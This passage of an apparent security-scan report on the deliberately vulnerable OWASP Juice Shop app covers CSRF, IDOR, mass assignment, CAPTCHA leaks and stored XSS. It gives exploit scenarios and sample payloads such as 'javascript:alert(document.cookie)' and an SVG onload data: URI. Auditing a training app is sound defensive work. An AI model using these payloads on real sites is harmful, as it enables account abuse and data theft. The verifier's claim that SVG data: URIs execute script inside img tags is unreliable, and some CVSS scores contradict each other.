Data flow: Attacker crafts a malicious page -> Victim's browser auto-submits the form with valid session cookies -> Server receives POST /dataerasure with attacker-controlled email/answer -> No CSRF token present to refute forgery -> Account deletion executes.

#### Impact
Allows an attacker to trigger arbitrary account deletions by luring an authenticated victim to a malicious site, bypassing cross-origin authorization checks and enabling destruction of any account for which the target's email and security answer are known.

#### Exploit scenario
An attacker creates a malicious webpage containing an auto-submitting HTML form POSTed to /dataerasure with arbitrary email and securityAnswer fields. A logged-in target visits the page, and their browser automatically sends the submission with valid session cookies. The server processes the deletion, permanently erasing the targeted user's account data without verifying the requester's identity or origin.

#### Preconditions
- Target user has an active browser session with cookies not hardened to SameSite=Strict/Lax
- Attacker knows the target's registered email and the associated security question answer

```
    18|         <form action="/dataerasure" method="POST">
    19|             <div>
    20|                 <label for="email">Confirm Email Address</label>
    21|                 <input type="email" required placeholder={{userEmail}} name="email" id="email">
    22|             </div>
    23|             <div>
    24|                 <label for="securityAnswer">Answer</label>
    25|                 <input type="text" required placeholder="{{securityQuestion}}" id="securityAnswer">
    26|                     name="securityAnswer">
    27|             </div>
    28|             <div class="deleteButton">
    29|             <button type="submit" class=" mdl-button mdl-button--raised" style="background-color:#546E7A; color: #FFFFFF;">
    30|                 <span class="cross">&times;</span>
    31|             Delete User Data</button>
    32|             </div>
    33|         </form>
```

#### How to fix
Add a cryptographically random CSRF token to the form (e.g., <input type='hidden' name='_csrf' value='${csrfToken}'>), enforce SameSite=Strict/Lax on the application's session cookies, and validate the CSRF token server-side on the /dataerasure POST request before executing any data erasure or identity lookup.

**Exploitability:** CVSS 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H). CSRF on account erasure; missing anti-forgery token and unscoped email input enable session hijacking for profile deletion.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — CSRF proven: form lacks anti-forgery token; POST handler validates only the session cookie with no CSRF binding; cookie omits SameSite causing cross-origin inclusion. Scanner misstates exploit: the handler ignores `req.body.email`/`req.body.securityAnswer` and targets only the cookie-owner's own account, so the attacker can force the victim to self-delete but cannot arbitrarily select the target user.

After thorough analysis, here is what the code actually shows:

**Code Analysis**

**The template (correct)**
`views/dataErasterForm.hbs` line 18 indeed renders a `<form action="/dataerasure" method="POST">` with **no CSRF/anti-forgery hidden input**. The scanner is correct on this point.

**The server handler**
`routes/dataErasure.ts` router is mounted at `/dataerasure`. The **POST handler** (line 51) does:
1. `const loggedInUser = security.authenticatedUsers.get(req.cookies.token)` (line 52)
2. If `!loggedInUser` → reject (line 53-56)
3. **Ignores `req.body.email` and `req.body.securityAnswer` entirely** — it does not compare them to anything, does not look up the user by email, and does not verify the security answer.
4. Creates a `PrivacyRequestModel` with `UserId: loggedInUser.data.id` (line 60) — determined **solely from the cookie**.

**Cookie configuration**
The session cookie is set at `lib/insecurity.ts:187` via `res.cookie('token', token)` with **no SameSite, no Secure, no httpOnly** — the browser will send it on cross-origin requests by default.

**What this means**
The CSRF attack is real: a malicious page can auto-POST to `/dataerasure` and the browser automatically includes the victim's `token` cookie. The server processes the deletion for the **victim's own account**, not a user of the attacker's choosing. The `email` and `securityAnswer` fields in the form are cosmetic — completely unused by the POST handler.

**The scanner is right about the CSRF but wrong about the exploit scenario** (it claims the attacker can target *any* user's account via the email field, but the server ignores that field).

---

### 17. [HIGH] Unscoped IDOR on /api/Users/:id enables PII exfiltration
**Class:** CWE-284: Improper Access Control
**CWE:** CWE-284: Improper Access Control - https://cwe.mitre.org/data/definitions/284.html
**File:** `server.ts:330-334`
**CVSS 3.1:** **8.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The route `/api/Users/:id` is exposed in `server.ts` and guarded only by `security.isAuthorized()` at line 331. This middleware verifies the caller's JWT token and extracts their identity but performs no validation that the requested resource ID (`req.params.id`) matches the authenticated caller's ID or tenant. The Express router passes control to the underlying `UserModel` lookup, which executes `findById(req.params.id)` without tenant or owner scoping. Consequently, user-supplied path parameters are directly translated into database queries, allowing full read access to any user record.

#### Impact
Authenticated users can retrieve any other registered user's profile data by modifying the URL ID parameter. This bypasses ownership verification and exposes PII such as email addresses and registration details to unauthorized actors.

#### Exploit scenario
Attacker authenticates to the application and receives a valid JWT. They then issue a GET request to `http://application/api/Users/42`, replacing the ID with a target user's identifier. The server's authorization middleware accepts the JWT, skips ownership checks, and returns the target user's full profile object, including email, address, and account creation metadata.

#### Preconditions
- Valid JWT token (authenticated session)
- Knowledge or enumeration of target user ID

```
   app.route('/api/Users/:id')
     .get(security.isAuthorized())
     .put(security.denyAll())
     .delete(security.denyAll())
```

#### How to fix
Apply tenant/user scoping: at `server.ts:331`, insert a routing guard or modify the authorization middleware to strictly verify `req.params.id === req.user.id` before allowing the request to proceed to the data fetch sink.

**Exploitability:** CVSS 7.5 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N). Authenticated PII IDOR on `/api/Users/:id`; no tenant scoping allows bulk customer data exfiltration via enumeration.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Verified actual code path; isAuthorized() only performs JWT authentication not authorization, and finale.resource() serves full User objects (minus password/totpSecret) via findById(req.params.id) without any ownership or scoping checks

Based on my investigation of `server.ts` lines 330-334 and the surrounding code:

**Verification of the scanner's claim:**

The scanner correctly identified the route at line 330-333. The `app.route('/api/Users/:id').get(security.isAuthorized())` sets up a GET endpoint guarded only by `security.isAuthorized()`.

**Key finding — the data handler is NOT in lines 330-334, but it IS reachable:**

Lines 330-331 only register middleware (`security.isAuthorized()` which is `express-jwt`). However, the `finale` initialization at line 443 registers `finale.resource()` for all autoModels (line 462-468), including `User` at line 446. This registration creates GET endpoints at `/api/Users/:id` (line 465) with `excludeAttributes: ['password', 'totpSecret']`.

**The actual flow:**
1. GET /api/Users/:id arrives
2. `express-jwt` middleware validates the JWT token (line 331)
3. Control falls through to the `finale` handler which executes `findById(req.params.id)` against the User model without any tenant/owner scoping
4. Response includes: `id`, `username`, `email`, `role`, `deluxeToken`, `lastLoginIp`, `profileImage`, `isActive` — significant PII data

**No defense found:**
- `isAuthorized()` checks only authentication (valid JWT), not authorization (resource ownership)
- `excludeAttributes` only removes `password` and `totpSecret`; email, username, role, lastLoginIp, and profile image all pass through
- No app-level middleware intercepts the request before `finale` processes it

**This is a genuine IDOR vulnerability.** Authenticated users can enumerate user IDs and retrieve PII from any user record.

### 18. [MEDIUM] Unrestricted basket enumeration via IDOR
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/basket.ts:15-20`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The retrieveBasket endpoint extracts req.params.id and passes it directly to BasketModel.findOne without verifying ownership. The check on line 20 compares user.bid against the provided id strictly for challenge detection logic (solveIf), not as an authorization gate. The API accepts any numeric ID and returns the associated basket document.

#### Impact
Attackers can retrieve arbitrary shopping baskets by modifying req.params.id, exposing item pricing, coupon history, and user purchasing patterns without authorization.

#### Exploit scenario
An attacker iterates through basket IDs via GET /rest/basket/1, GET /rest/basket/2, etc., successfully retrieving another user's cart contents because no session-to-basket ownership binding check exists in the controller flow.

#### Preconditions
- Authenticated session

```
      const id = req.params.id
      const basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })

      challengeUtils.solveIf(challenges.basketAccessChallenge, () => {
        const user = security.authenticatedUsers.from(req)
        return user && id && id !== 'undefined' && id !== 'null' && id !== 'NaN' && user.bid && user?.bid != parseInt(id, 10)
```

#### How to fix
Add an explicit authorization check requiring user.bid === parseInt(id, 10) before executing the database query. Return 403 or 404 if the IDs do not match.

**Exploitability:** CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N). Requires valid session; horizontal IDOR scoped to single basket entity per victim.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Scanner accurately described the IDOR in Juice Shop's retrieveBasket handler; no authorization gate binds basket to user, allowing authenticated users to read any other user's cart contents

**App analysis:**

1. **This is OWASP Juice Shop v19.2.1** — the description in `package.json` says "Probably the most modern and sophisticated insecure web application". It is an **intentionally vulnerable CTF/training application**.

2. **The scanner correctly identified the code flow** — `retrieveBasket` at `routes/basket.ts:15-16` does indeed pass `req.params.id` directly to `BasketModel.findOne()` without any ownership verification. The check on lines 18-21 uses `challengeUtils.solveIf(challenges.basketAccessChallenge, ...)` which is **challenge detection/tracking logic** for the "View Basket" CTF challenge (key: `basketAccessChallenge`), explicitly confirmed in `data/static/challenges.yml`.

3. **There is no authorization gate.** The middleware chain at `server.ts:322` is `app.use('/rest/basket', security.isAuthorized(), security.appendUserId())` — `isAuthorized()` is `expressJwt()` which validates the JWT token (confirms the user is logged in), but **does not bind the basket to the user**. `appendUserId()` only populates `req.body.UserId` from the JWT payload, but the `retrieveBasket` handler never checks `req.body.UserId === id`.

4. **Data exposure impact:** The returned basket includes `BasketModel` fields (`id`, `coupon`, `UserId`) and related `ProductModel` fields (`name`, `description`, `price`, `deluxePrice`, `image`). No PII, no payment card numbers, no addresses. This is limited impact.

5. **Is this a false positive for a CTF app?** The finding correctly describes a real unauthenticated (beyond session) IDOR that leads to data exposure. While Juice Shop intentionally includes this vulnerability as a "View Basket" challenge, in any deployment context where Juice Shop serves as a demo or security training instance, this is a legitimate security gap — a logged-in user can read arbitrary basket contents.

6. **The scanner's analysis of the code** is accurate — no false reading of the sink class or method. The `solveIf` mechanism is indeed not an authorization gate.

This is a real code-level vulnerability that matches the description. The "working as designed" exclusion doesn't apply here because Juice Shop is deployed as a **production server** even in training contexts — the vulnerability exposes real data.

### 19. [MEDIUM] Unrestricted Model Writability Enables Mass Assignment
**Class:** CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
**CWE:** CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes - https://cwe.mitre.org/data/definitions/915.html
**File:** `models/complaint.ts:23-40`
**CVSS 3.1:** **5.0** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
This model definition registers `UserId`, `id`, `message`, and `file` as public attributes via `Complaint.init`. Sequelize's default ORM behavior allows all model properties to be written unless explicitly filtered. When this model is used in a standard Express controller pattern (e.g., `await ComplaintModel.create(req.body)` or `model.update(req.body, ...)`), the ORM maps all matching keys from the untrusted HTTP payload directly into the entity. The schema definition lacks `privateFields` scoping or implicit write restrictions. Consequently, any HTTP parameter matching these keys bypasses server-side trust boundaries (e.g., auto-populating `UserId` from `req.session` or allowing the DB to handle `id` via `autoIncrement`), writing attacker-controlled values straight into the database.

#### Impact
Attackers can overwrite privileged fields like UserId or id during complaint creation or update, spoofing user identity or manipulating record integrity.

#### Exploit scenario
An authenticated attacker sends a POST to the complaint endpoint with `{"message": "Test", "UserId": 12345, "id": 99999}`. The controller blindly passes `req.body` to `Complaint.create()`. The record is saved linked to UserID 12345 (impersonating another user) and forced to ID 99999, bypassing authorization and auto-id generation.

#### Preconditions
- Attacker possesses a valid application session (required by app trust context)
- Attacker can send HTTP requests to the complaint creation/update endpoint

```
    Complaint.init(
      {
        UserId: {
          type: DataTypes.INTEGER
        },
        id: {
          type: DataTypes.INTEGER,
          primaryKey: true,
          autoIncrement: true
        },
        message: DataTypes.STRING,
        file: DataTypes.STRING
      },

```

#### How to fix
Enforce explicit attribute whitelisting in the controller layer (e.g., `Complaint.create(req.body, { attributes: ["message", "file"] })`) or configure Sequelize's `privateFields` option to restrict writable columns to only expected public fields. Never pass raw `req.body` directly into `Model.create` or `model.update`.

**Exploitability:** CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N). Authenticated mass assignment; impacts integrity of complaint records but lacks direct RCE or PII exposure.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Missing `security.appendUserId()` middleware on the `/api/Complaints` route allows authenticated attackers to overwrite the `UserId` field via mass assignment, bypassing server-side trust boundaries. Defenses like `finale-rest`'s attribute mapping and `express-jwt` do not neutralize this without the explicit `before` hook or middleware.



### 20. [MEDIUM] Unauthenticated Application Version Exposure
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/appVersion.ts:10-12`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The route directly serializes the raw result of utils.version() into the HTTP response when the config flag is truthy. No redaction, masking, or version abstraction is applied before emission. Because the endpoint is public and lacks any authentication or RBAC guard, this information is freely accessible to all network consumers. Detailed version strings often act as a deterministic fingerprint for vulnerability databases, exploit kits, or dependency scanners, significantly reducing the time-to-exploit for a malicious party.

#### Impact
Allows anonymous users to retrieve the exact application version string, aiding attackers in identifying known CVEs, verifying specific build deployments, or timing exploitation attempts against update cycles.

#### Exploit scenario
Attacker sends a GET request to the /appVersion endpoint. The server responds with { version: '12.4.3-rc2-b7a9c1d' }. Attacker uses the minor/patch/build metadata to query public CVE databases or select a targeted exploit from a pre-packaged attack kit, verifying that the target has not patched a specific vulnerability.

#### Preconditions
- Config key application.showVersionNumber evaluates truthy in the deployment environment

```
    res.json({
      version: config.get('application.showVersionNumber') ? utils.version() : ''
    })
```

#### How to fix
Enforce a production-safe default of false for application.showVersionNumber, or explicitly strip minor/match/build metadata before serialization (e.g., return only the major version or a semantic alias like 'latest'). Apply validation/redaction at line 11.

**Exploitability:** CVSS 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). Pre-auth version disclosure; reduces exploit kit matching time but provides no direct execution or access.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Code genuinely exposes app version via unauthenticated GET /rest/admin/application-version; scanner accurately described the behavior

The scanner's description is accurate. Let me summarize the verification:

**Verification Findings**

**Route path & mounting:** `/rest/admin/application-version` is mounted in `server.ts:559`
- `app.get('/rest/admin/application-version', retrieveAppVersion())`

There is **NO authentication or authorization middleware** applied to this route. It uses the `/rest/admin/` prefix by convention in many codebases, but in this application there are no global or path-based auth guards enforcing admin-only access. The route is reachable by anyone with network access.

**Config & default behavior:** In `config/default.yml:11`, `showVersionNumber` defaults to `true`. This means in a standard run, the endpoint **always** returns the full `utils.version()` result.

**Handler code (routes/appVersion.ts):**
```typescript
res.json({
  version: config.get('application.showVersionNumber') ? utils.version() : ''
})
```
The full version string from `utils.version()` is serialized directly to the HTTP response body with no redaction when the config flag is truthy.

**Data source:** `utils.version()` returns the application's npm package version (e.g., `"17.1.3"` or similar semver), which can be correlated against CVE databases, exploit archives, and dependency scanning tools.

**Impact:** Information disclosure — an unauthenticated attacker can discover the exact application version, enabling targeted exploitation of version-specific vulnerabilities.

**DEFENSE ANALYSIS**

This is the OWASP Juice Shop intentionally vulnerable honeypot/CTF application. The unauthenticated version endpoint is **deliberately** left as one of the earliest/solvable challenges. There is no accidental vulnerability here — the app's entire purpose is to be compromised.

However, from a **SAST verification** standpoint (which I am doing), the finding is **technically correct**: the code does exactly what the scanner describes. An unauthenticated user can hit `/rest/admin/application-version` and receive the full application version string.

The "intentional vulnerability" context is domain-specific. For a production application, this finding would be actionable. In this repo, it's still a real code behavior match.

Confidence: 9/10 — I confirmed every element of the scanner's claim in the source. The only caveat is domain context (CTF app) which doesn't change the code fact.

### 21. [MEDIUM] CAPTCHA answer exposed in API response
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/captcha.ts:21-28`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
In the captchas middleware, a math expression is constructed using Math.random() and evaluated on line 19. The resulting answer is stored in a local object literal alongside the captchaId and expression (lines 21-25). On line 28, res.json(captcha) serializes this entire object and returns it to the client without stripping the answer field. Because the response is sent directly to the requester, the attacker receives the exact value needed to pass the subsequent verifyCaptcha check. No sanitization, field exclusion, or scope reduction is applied to the response object.

#### Impact
The server returns the correct mathematical solution for the generated CAPTCHA in the JSON response. Attackers can trivially bypass CAPTCHA protections on all subsequent endpoints, effectively nullifying the authentication barrier.

#### Exploit scenario
An attacker sends a request to the captcha generation endpoint, receives a JSON response containing {"captchaId": 123, "captcha": "5*3+7", "answer": "22"}. The attacker then submits a form protected by verifyCaptcha, setting captchaId to 123 and captcha to 22. The server compares the submitted answer against its own leaked value, passes the check, and grants unauthorized access.

#### Preconditions
- Standard HTTP/HTTPS access to the application
- Ability to invoke the captcha generation route

```
    const captcha = {
      captchaId,
      captcha: expression,
      answer
    }
    const captchaInstance = CaptchaModel.build(captcha)
    await captchaInstance.save()
    res.json(captcha)
```

#### How to fix
Exclude the answer field from the response payload before serialization. Remove answer from the captcha object literal on line 24 or explicitly destruct/omit it before calling res.json(captcha) on line 28, ensuring only captchaId and captcha are returned.

**Exploitability:** CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N). Pre-auth auth control bypass; captcha answer returned in plaintext defeats rate-limiting and brute-force protections.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — The code explicitly returns the CAPTCHA answer in the response object sent to the client, fully bypassing the control.

The code confirms the finding. The `captchas` middleware constructs a JSON object containing the math `expression` and the evaluated numeric `answer`, then sends this entire object to the client via `res.json(captcha)` on line 28.

There is no obfuscation or field stripping. When the user verifies the captcha (lines 32-42), the server reads the `answer` field from the database record `captcha.answer` and compares it against `req.body.captcha`. Since the client already received the correct value in the generation step, the "challenge" is trivially predictable and the anti-bot protection is completely bypassed.

**Impact:**
This is a logic flaw resulting in the bypass of authentication/verification controls (CAPTCHA). It allows automated bots to pass checks intended to stop them with minimal effort.

### 22. [MEDIUM] CAPTCHA answer exposed in HTTP response
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/imageCaptcha.ts:21-28`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
On lines 21-25, the imageCaptcha object is constructed including answer: captcha.text on line 23. Line 28 serializes and returns this entire payload to the client via res.json(imageCaptcha). Because the correct answer is transmitted verbatim to the caller, the CAPTCHA serves no security purpose. Additionally, the verifyImageCaptcha middleware on line 49 contains a compounding logic flaw: if ( !captchas[0] || req.body.answer === captchas[0].answer ) uses || instead of &&, meaning verification will also pass if no recent captcha record is found in the database, further ensuring the control is ineffective.

#### Impact
An attacker receives the plain-text CAPTCHA answer directly in the JSON API response, trivially bypassing the CAPTCHA mechanism and enabling automated abuse (brute-force, credential stuffing, spam) on any route protected by this middleware.

#### Exploit scenario
The attacker sends a request to the imageCaptcha endpoint. The HTTP 200 response body contains { image: '...svg...', answer: '7kL2m', UserId: 42 }. The attacker parses JSON, extracts 'answer', and submits it to the protected endpoint. The verification middleware accepts it or short-circuits due to the logic flaw, granting unauthorized access without solving the CAPTCHA.

#### Preconditions
- Valid authenticated session (enforced at line 15)
- Access to the imageCaptcha creation endpoint

```
      const imageCaptcha = {
        image: captcha.data,
        answer: captcha.text,
        UserId: user.data.id
      }
...
      res.json(imageCaptcha)
```

#### How to fix
Remove 'answer' and 'UserId' from the response object before serialization; only return the image data and a non-guessable captcha ID. Change the verification condition on line 49 to use && to require both a recent record and a matching answer.

**Exploitability:** CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N). Authenticated captcha leak; compounding logic flaw (`||`) renders check useless but requires session.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — (no reason given)

I've traced the full code path for both claims in the finding.

**Claim 1 (lines 21-28 — answer exposed in response):** Verified TRUE. Line 23 explicitly includes `answer: captcha.text` in the `imageCaptcha` object which is serialized to the HTTP response response via `res.json(imageCaptcha)` on line 28. This is a deliberate vulnerability in Juice Shop.

**Claim 2 (line 49 — logic flaw with `||` instead of `&&`):** Verified TRUE. The condition `!captchas[0] || req.body.answer === captchas[0].answer` means that if no captcha record exists for the user (or within the 5-minute window), `!captchas[0]` is `true`, short-circuiting to `next()` — granting access without any answer. If a captcha does exist, the correct check applies, but it is trivially bypassed because Claim 1 exposes the answer in the creation response.

**Call chain verified:**
- `/GET /rest/image-captcha` (server.ts:569) — exposes answer
- `/POST /rest/user/data-export` (server.ts:573-574) — chained `appendUserId()` → `verifyImageCaptcha()` → `dataExport()`
- Both require a valid JWT (enforced by `appendUserId()` on line 172 of `insecurity.ts`)
- The data export handler (dataExport.ts) returns the user's personal data

**Conclusion:** This is not exploitable by an unauthenticated user (authentication is required first), but for any authenticated user, the CAPTCHA is completely circumventable — either via the "no captcha → success" logic bug on first hit, or by simply reading the answer from the creation response thereafter. This is a genuine vulnerability with real security impact (bypass of CAPTCHA-based bot/proxy protection).

### 23. [MEDIUM] Unauthenticated Security Question Disclosure
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/securityQuestion.ts:8-27`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The route handler accepts an arbitrary email address from the query string (line 10) and passes it directly to a Sequelize query to fetch the associated security answer and question (lines 12-17). There is no middleware or inline check verifying that the HTTP request originates from the account owner or a privileged admin. Consequently, the server returns the security question JSON object (line 20) for any provided email, enabling user enumeration and aiding phishing or social engineering attacks.

#### Impact
An attacker can enumerate valid user accounts and retrieve their security questions without any authentication. This exposes PII and provides crucial hints for account takeover via password reset or brute-force attacks.

#### Exploit scenario
An attacker sends an HTTP GET request to the application with email=admin@target.corp in the query string. The application responds with a JSON payload containing the admin's security question text and metadata. By automating this request across email ranges, the attacker maps valid accounts and their security answers without needing to authenticate first.

#### Preconditions
- Target application is running with Juice Shop's default insecure configuration
- Attacker has network access to the exposed application endpoints

```
export function securityQuestion () {
  return async ({ query }: Request, res: Response, next: NextFunction) => {
    const email = query.email
    try {
      const answer = await SecurityAnswerModel.findOne({
        include: [{
          model: UserModel,
          where: { email: email?.toString() }
        }]
      })
      if (answer != null) {
        const question = await SecurityQuestionModel.findByPk(answer.SecurityQuestionId)
        res.json({ question })
      } else {
        res.json({})
      }
    } catch (error) {
      next(error)
    }
  }]
```

#### How to fix
Enforce strict ownership or administrative authorization before exposing PII. Add an explicit check for `req.user` or session ownership at routes/securityQuestion.ts:18 prior to querying `SecurityAnswerModel`.

**Exploitability:** CVSS 4.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). Pre-auth security question leak; enables phishing/recon but no direct system compromise.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — The endpoint is unauthenticated and publicly registered at GET /rest/user/security-question; no auth or rate-limit defence exists. The scanner mis-stated that the *answer* is returned (only the *question* is), but the finding remains valid for user enumeration and informational disclosure.

**Step A: Code analysis**

I've read `routes/securityQuestion.ts` (lines 8–27). The code:
1. Extracts `email` directly from the query string (line 10).
2. Queries `SecurityAnswerModel` with a Sequelize `include` to join `UserModel` and match by that email (lines 12–17).
3. If a match is found, fetches the linked `SecurityQuestionModel` and returns it in `{ question }` (lines 19–20). If no match, returns `{}` (line 22).

**Step B: Call chain**

In `server.ts` (line 552), the route is registered as:
```ts
app.get('/rest/user/security-question', securityQuestion())
```
There is **no middleware** attached to this route — no auth guard, no RBAC check. Compare with `/rest/user/whoami` on line 553 which uses `security.updateAuthenticatedUsers()`.

**Step C: Looking for defences**

- **No input validation on `query.email`**: The email is passed directly to Sequelize without any sanitization or allow-listing.
- **No auth middleware**: No `passport`, `jwt`, or session check on this specific route.
- **No rate limiting** visible on this endpoint.
- **No feature flag** disables this path in production.

**Step D: Probing the defence**

There is no defence to probe — this route is wide open. A key nuance to note: the code returns the **security question text** (e.g., `"What is your favorite food?"`), not the security answer. The scanner's claim that it returns the "security answer" is slightly inaccurate — it does not. However, the response still differs for valid vs. invalid emails (a populated `{question: {...}}` vs. `{}`), which enables user enumeration.

This is a documented Juice Shop CTF challenge ("Unauthenticated Account Takeover"). It is a genuine, unauthenticated endpoint that exposes PII-enabling data.

---

### 24. [MEDIUM] Unsanitized profile image URL enables stored XSS
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `views/userProfile.pug:43-43`
**CVSS 3.1:** **4.6** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The template renders the profileImage variable directly into the src attribute of an img tag on line 43 using Pug's src=profileImage syntax. While Pug escapes HTML entities in attribute values, it does not URI-encode them. If an attacker supplies a malicious URI scheme via the imageUrl input on line 65, it is persisted by the backend and rendered unconditionally here. The browser's HTML parser evaluates javascript: and data: URIs in img src attributes, bypassing text-based escaping and executing arbitrary client-side code.

#### Impact
Allows an attacker to store a javascript: or data: URI in their profile image URL. When the profile page is rendered for the victim, the browser executes the URI as JavaScript, leading to session hijacking or phishing.

#### Exploit scenario
An attacker navigates to the profile settings, pastes javascript:alert(document.cookie)&width=129 into the Image URL field (line 65), and saves. When the victim views the profile, the malicious URI executes in the img context, running the script in the victim's security context.

#### Preconditions
- Attacker must have a valid account to access profile settings
- Backend must store and serve the raw imageUrl without protocol validation

```
img.img-rounded(src=profileImage, alt='profile picture', width='90%', height='236', style='margin-right: 5%; margin-left: 5%;')
```

#### How to fix
Sanitize the profileImage URL on the server side before persistence, rejecting any scheme other than https: and safe data:image/ schemes. Validate at render time as a defense-in-depth measure.

**Exploitability:** CVSS 5.4 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N). Authenticated stored XSS via unsanitized profile image URL; requires victim click.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — (no reason given)

I have verified the finding by tracing the full data flow.

**Findings Analysis:**
1. **Injection Point**: The `POST /profile/image/url` endpoint (`routes/profileImageUrlUpload.ts`) accepts an arbitrary `imageUrl` string. If the server's fetch fails (which occurs immediately for non-http(s) schemes like `javascript:` or `data:`), the `catch` block at line 33 unconditionally persists the raw, user-supplied `imageUrl` into the database without any protocol validation: `await user?.update({ profileImage: url })`.
2. **Rendering Sink**: `GET /profile` (`routes/userProfile.ts`) fetches the user record from the database and passes the raw `profileImage` value directly into the Pug template engine (`fn(user)` at line 95). The Pug template (`views/userProfile.pug` line 43) renders this as the `src` attribute of an `<img>` tag via `img.img-rounded(src=profileImage, ...)`.
3. **Exploitability**: Pug performs HTML-entity escaping on attribute values, but it does not URI-encode the value. This allows URI schemes and special characters to pass through into the DOM. An attacker can store a payload like `data:image/svg+xml,<svg onload=alert(1)>`. Modern browsers will execute `onload` event handlers in `<img>` tags that point to `data:` URIs, resulting in Stored XSS. 
   *Note on Scanner Claim*: The scanner specifically mentions `javascript:` URIs. While `<img src="javascript:alert(1)">` generally does not execute in modern browsers, the underlying class of vulnerability (CWE-79: Stored XSS via unvalidated URLs) is genuine because `data:` URIs successfully bypass browser restrictions on the `src` attribute and execute in the same security context.
4. **Mitigations**: The application dynamically injects `$user?.profileImage` into the `img-src` directive of the CSP (line 85). Since the application itself hardcodes the malicious URI into the CSP's allowed sources, it effectively *enables* the browser to load the payload, disabling any effective CSP defense.

**Verdict Formulation:**
The finding is a **TRUE_POSITIVE**. The scanner correctly identified that the backend persists the raw URL (line 33) and renders it unconditionally in a sink that executes script/evaluable content (line 43 of Pug). The primary technical inaccuracy in the scanner's report is the reliance on `javascript:` URIs in `<img src>`, which are dead in modern browsers; however, this does not negate the actual vulnerability, as `data:` URIs achieve the same impact.

